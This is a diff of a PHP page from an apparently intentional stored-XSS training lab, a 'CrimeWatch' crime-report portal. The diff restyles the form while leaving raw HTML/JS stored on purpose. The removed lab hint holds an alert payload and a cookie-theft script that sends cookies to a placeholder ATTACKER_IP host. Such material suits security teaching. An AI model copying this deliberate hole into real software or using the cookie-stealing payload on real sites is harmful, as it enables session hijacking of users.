@@ -1,61 +1,89 @@
 <?php
-// ⚠️  INTENTIONALLY VULNERABLE - Stored XSS Lab Demo
+// INTENTIONALLY VULNERABLE - Stored XSS
 session_start();
-if (!isset($_SESSION['user'])) {
-    header("Location: login.php");
-    exit();
-}
+if (!isset($_SESSION['user'])) { header("Location: login.php"); exit(); }
 include 'config.php';
 
 $success = "";
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $title       = $_POST['title'];
-    $description = $_POST['description'];
-    $location    = $_POST['location'];
+    $title       = mysqli_real_escape_string($conn, $_POST['title']);
+    $description = mysqli_real_escape_string($conn, $_POST['description']);
+    $location    = mysqli_real_escape_string($conn, $_POST['location']);
     $posted_by   = $_SESSION['user'];
 
-    // ❌ VULNERABLE: No sanitization - stores raw HTML/JS (Stored XSS)
+    // VULNERABLE: Stores raw HTML/JS — Stored XSS when displayed without escaping
     $query = "INSERT INTO reports (title, description, location, posted_by)
               VALUES ('$title', '$description', '$location', '$posted_by')";
     mysqli_query($conn, $query);
-    $success = "Report posted successfully!";
+    $success = "Report submitted successfully.";
 }
+
+$initial = strtoupper(substr($_SESSION['user'], 0, 1));
 ?>
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Post Crime Report</title>
-    <link rel="stylesheet" href="css/style.css">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CrimeWatch — Post Report</title>
+<link rel="stylesheet" href="css/style.css">
 </head>
 <body>
-<div class="container">
-    <h2>Post a Crime Report</h2>
-    <a href="dashboard.php">← Back to Dashboard</a><br><br>
+<div class="app">
+  <aside class="sidebar">
+    <div class="sidebar-logo">
+      <div class="badge">🔍</div>
+      <span>CrimeWatch<br>Portal</span>
+    </div>
+    <div class="nav-section">
+      <div class="nav-label">Menu</div>
+      <a href="dashboard.php" class="nav-item"><span class="icon">📋</span> Dashboard</a>
+      <a href="post_report.php" class="nav-item active"><span class="icon">➕</span> Post Report</a>
+      <a href="search.php" class="nav-item"><span class="icon">🔎</span> Search</a>
+      <a href="update_email.php" class="nav-item"><span class="icon">✉️</span> Update Email</a>
+    </div>
+    <div class="sidebar-footer">
+      <div class="user-chip">
+        <div class="user-avatar"><?php echo $initial; ?></div>
+        <div class="user-info">
+          <div class="name"><?php echo htmlspecialchars($_SESSION['user']); ?></div>
+          <div class="role">Officer</div>
+        </div>
+        <a href="logout.php" title="Logout" style="color:var(--muted);font-size:16px;text-decoration:none;">⏏</a>
+      </div>
+    </div>
+  </aside>
 
-    <?php if ($success): ?>
-        <p class="success"><?php echo $success; ?></p>
-    <?php endif; ?>
+  <main class="main">
+    <div class="page-header">
+      <h1>Post a Crime Report</h1>
+      <p>Submit a new incident for review.</p>
+    </div>
 
-    <form method="POST" action="post_report.php">
-        <label>Title:</label>
-        <input type="text" name="title" required>
+    <div class="form-card">
+      <?php if ($success): ?>
+        <div class="alert alert-success">✓ <?php echo $success; ?></div>
+      <?php endif; ?>
 
-        <label>Description:</label>
-        <textarea name="description" rows="4" required></textarea>
-
-        <label>Location:</label>
-        <input type="text" name="location">
-
-        <button type="submit">Submit Report</button>
-    </form>
-
-    <br>
-    <small>
-        <strong>Lab Hint (Stored XSS):</strong><br>
-        Try in Title field: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
-        Cookie theft: <code>&lt;script&gt;document.location='http://ATTACKER_IP/steal.php?c='+document.cookie&lt;/script&gt;</code>
-    </small>
+      <form method="POST" action="post_report.php">
+        <div class="form-group">
+          <label>Report Title</label>
+          <input type="text" name="title" placeholder="e.g. Robbery at Central Mall" required>
+        </div>
+        <div class="form-group">
+          <label>Description</label>
+          <textarea name="description" placeholder="Describe the incident in detail..." required></textarea>
+        </div>
+        <div class="form-group">
+          <label>Location</label>
+          <input type="text" name="location" placeholder="e.g. Main Street, Downtown">
+        </div>
+        <div class="divider"></div>
+        <button type="submit" class="btn btn-primary">Submit Report</button>
+      </form>
+    </div>
+  </main>
 </div>
 </body>
 </html>
